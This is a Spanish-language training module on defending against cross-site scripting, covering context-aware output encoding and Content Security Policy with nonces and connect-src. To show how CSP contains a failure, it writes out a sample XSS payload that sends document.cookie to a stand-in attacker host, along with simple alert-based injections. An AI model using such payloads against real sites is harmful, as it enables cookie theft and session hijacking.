# Módulo 3 — Cross-Site Scripting (XSS)

## Objetivo 3: Defensa en Profundidad (*Output Encoding* y *Content Security Policy*)

### 1. Introducción: El Principio de Defensa en Profundidad contra XSS

En la arquitectura de seguridad web moderna, confiar en un único control perimetral (como un WAF) o en filtros de entrada (*input sanitization* mediante listas negras) resulta insuficiente frente a la diversidad de vectores de inyección en el cliente. Para erradicar de forma definitiva el riesgo de **Cross-Site Scripting (XSS)**, un arquitecto de seguridad diseña una estrategia de **Defensa en Profundidad (*Defense in Depth*)** basada en dos capas complementarias e independientes:

1. **Capa 1 (Prevención en el Código): *Context-Aware Output Encoding*** — Neutraliza los datos antes de que sean interpretados por el parser del navegador.
2. **Capa 2 (Contención en el Navegador): *Content Security Policy (CSP)*** — Restringe qué código puede ejecutarse y hacia dónde pueden enviarse los datos si la primera capa llegara a fallar por un error de desarrollo.

---

### 2. Capa 1: *Output Encoding* (Codificación de Salida) a Nivel de Código

#### ¿Qué es y cómo funciona?
El **Output Encoding** consiste en transformar los caracteres potencialmente peligrosos ingresados por el usuario en su representación literal segura (**entidades codificadas**) justo antes de renderizarlos en la respuesta HTTP o insertarlos en el DOM.

De esta manera, se preserva la integridad del dato original para su visualización (el usuario ve exactamente lo que escribió), pero **se impide que el motor de renderizado del navegador lo interprete como instrucciones ejecutables (HTML o JavaScript)**.

#### La importancia del Contexto (*Context-Aware Encoding*)
Un error habitual es aplicar el mismo escape genérico en toda la aplicación. Un arquitecto debe exigir codificación específica según el contexto sintáctico donde aterrizará el dato:

* **Contexto de Cuerpo HTML (`<div>[DATO]</div>`):**
  Se convierten los delimitadores de etiquetas en entidades HTML:
  * `<` $\rightarrow$ `&lt;`
  * `>` $\rightarrow$ `&gt;`
  * `&` $\rightarrow$ `&amp;`
  * `"` $\rightarrow$ `&quot;`
  * `'` $\rightarrow$ `&#x27;`
  * *Resultado:* Si un atacante envía `<script>alert(1)</script>`, el navegador recibe `&lt;script&gt;alert(1)&lt;/script&gt;` y lo dibuja como texto plano en pantalla sin ejecutarlo.

* **Contexto de Atributo HTML (`<input value="[DATO]">`):**
  Además de codificar comillas (`"` y `'`), se deben codificar caracteres no alfanuméricos en formato hexadecimal (`&#xHH;`) y asegurar que todos los atributos estén siempre encerrados entre comillas dobles o simples para evitar que el atacante escape del atributo e inyecte un evento como `onfocus` o `onerror`.

* **Contexto de JavaScript (`<script>var user = "[DATO]";</script>`):**
  Los datos dinámicos nunca deben concatenarse directamente dentro de bloques `<script>`. Si es indispensable pasar variables al frontend, deben serializarse de forma segura (por ejemplo, dentro de atributos `data-*` codificados en HTML o mediante secuencias de escape Unicode `\uXXXX`).

* **Uso de Frameworks Modernos con Auto-Escapado:**
  Arquitecturas basadas en **React**, **Angular** o **Vue** aplican *Output Encoding* por defecto al interpolar variables en la vista (ej. `{userInput}`), bloqueando el XSS siempre que el desarrollador evite sumideros peligrosos como `dangerouslySetInnerHTML` o `innerHTML`.

---

### 3. Capa 2: *Content Security Policy (CSP)* a Nivel de Cabeceras HTTP

#### ¿Qué es y cómo funciona?
**Content Security Policy (CSP)** es un estándar de seguridad implementado mediante la cabecera de respuesta HTTP `Content-Security-Policy`. Actúa como un contrato de confianza entre el servidor y el navegador de la víctima: el backend le entrega al navegador una **lista blanca (*allowlist*) estricta** indicando desde qué orígenes está permitido cargar y ejecutar recursos (scripts, hojas de estilo, imágenes, *iframes* y conexiones de red).

#### ¿Cómo contiene un ataque XSS si falla la Capa 1?
Supongamos que un desarrollador introduce por error una vulnerabilidad XSS en un módulo heredado (por ejemplo, al habilitar un editor de texto enriquecido sin sanitizar) y un atacante logra inyectar `<script>fetch('https://atacante.com/steal?c='+document.cookie)</script>` o `<img src=x onerror=alert(1)>`.

Con una política CSP bien diseñada, **el navegador bloquea la ejecución y la exfiltración** mediante tres mecanismos clave:

1. **Bloqueo de Scripts *Inline* y Manejadores de Eventos (`script-src`):**
   Por defecto, al definir una directiva `script-src` sin la palabra clave insegura `'unsafe-inline'`, el navegador **prohíbe ejecutar cualquier etiqueta `<script>` incrustada directamente en el HTML** y desactiva automáticamente todos los manejadores de eventos en línea (`onerror`, `onload`, `onclick`) y pseudo-protocolos `javascript:`.

2. **Control Criptográfico mediante *Nonces* o *Hashes*:**
   Para permitir exclusivamente los scripts legítimos propios de la aplicación, el servidor genera un valor aleatorio criptográfico de un solo uso (**`nonce`**) en cada respuesta HTTP:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123xyz'; object-src 'none'; base-uri 'self'; connect-src 'self' https://api.misitio.com;
   ```
   El navegador ejecutará únicamente las etiquetas `<script nonce="rAnd0m123xyz">` que coincidan con la cabecera. Como el atacante no puede predecir el `nonce` dinámico de la víctima, cualquier script inyectado será ignorado por el navegador.

3. **Bloqueo de Exfiltración de Datos (`connect-src` / `img-src`):**
   Incluso en un escenario extremo donde un script lograra ejecutarse, directivas como `connect-src 'self' https://api.misitio.com` impiden que funciones como `fetch()` o `XMLHttpRequest` envíen las cookies o tokens robados hacia dominios externos controlados por el atacante.

---

### 4. Sinergia Arquitectónica (Resumen)

| Capa de Defensa | Nivel de Implementación | Rol en la Arquitectura | ¿Qué detiene? |
| :--- | :--- | :--- | :--- |
| **1. Output Encoding** | Código de Aplicación (Backend / Frontend) | **Prevención primaria:** Neutraliza la sintaxis del *payload* convirtiendo código en texto literal. | Detiene el 100% de las inyecciones XSS en los puntos donde se aplica correctamente. |
| **2. Content Security Policy (CSP)** | Infraestructura / Cabeceras HTTP | **Contención secundaria:** Restringe la ejecución de scripts no firmados/autorizados y bloquea conexiones salientes. | Mitiga el impacto si un desarrollador olvida codificar una salida o introduce un fallo en el DOM. |

Al combinar ambas capas, el arquitecto elimina tanto la **causa raíz** de la vulnerabilidad (la interpretación no intencionada de datos como código) como su **capacidad de explotación** en el navegador del usuario.
